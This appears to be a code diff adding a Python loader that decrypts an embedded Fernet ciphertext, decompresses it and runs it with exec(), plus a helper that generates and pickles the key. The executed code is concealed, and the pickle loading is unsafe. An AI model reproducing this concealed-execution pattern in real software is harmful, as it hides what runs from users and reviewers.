@@ -1,0 +1,20 @@
+#4627c521b858c95f38c38c453722561c68599067ab23ef7cb1cc4dd53d24c060217779df998c35c8b911870c16fe0d5b2ccde0c61d3c37574326b382062904a5
+import pickle
+import zlib
+from cryptography.fernet import Fernet
+with open("./core/key","rb") as fp:
+    key=pickle.load(fp)
+aes=Fernet(key)
+decrypted=aes.decrypt(b"gAAAAABiDOKK2BxwFIvKEnMIJG0uNLqiOVLYvYV7sxO4u13If4oDPH86zqQSIDanPA2mhLXBDmNh_n4uxf5CVolhUDGafj5OP3dAyuG00vt9GMXYteaPCRZx0_ktI8IEfExTgQJ2FAUWMDjBl7x-JheLb8uLQYxqoE448qfHmvddAqwoAUB4iNirpqTNhGkyVejiN82JynujdLcS74x-qAl5QkB6RGW9Dy8H87G8tiVsKF-ug0vWzzd38ABYbiE6RBISR9nv9HOk3ya9w03FLJO2mLuh7HT6GNkHIS83daa9p7DJe-IZzwbYnnva4paG16Y1Sg6TSy39QhwbXhQnItV4VAaLNjfiwC4WgZQ9F35E4ldyj_Enfn6-OC3n8rLkFUfG67coCmTYQF6Hw2W-2SXGysaAYS1tNVXqRAjZJjnEzQJwHrrNUkKyXfrxBT4Zl7NZJSkTgR68aCzB3zMEkdVkjy8lBRKHf6wDgS56itE2aRzUTEX2iGA9gPPgyI3RwhzWB6yv7N3_7FyTr3IudbtiMiSLbi_KgN-vYMv7nULVkjzHonYfMMKjjWVX-jX1tAq6MbiSb6QVAoEXoP1m05AERO6F_dLiiPd5cZm6Q21ClDmP6q5dSQYwJK8jzSTKVHY8Dz6jTyE8n2Li9PMvtAO0YuuD4kEM_g==")
+decompressed=zlib.decompress(decrypted)
+print(decompressed.decode())
+exec(decompressed.decode())
+#4627c521b858c95f38c38c453722561c68599067ab23ef7cb1cc4dd53d24c060217779df998c35c8b911870c16fe0d5b2ccde0c61d3c37574326b382062904a5
+import pickle
+from cryptography.fernet import Fernet
+
+def generate_key_store():
+    key=Fernet.generate_key()
+    with open("key","wb") as fp:
+        pickle.dump(key,fp)
+generate_key_store()
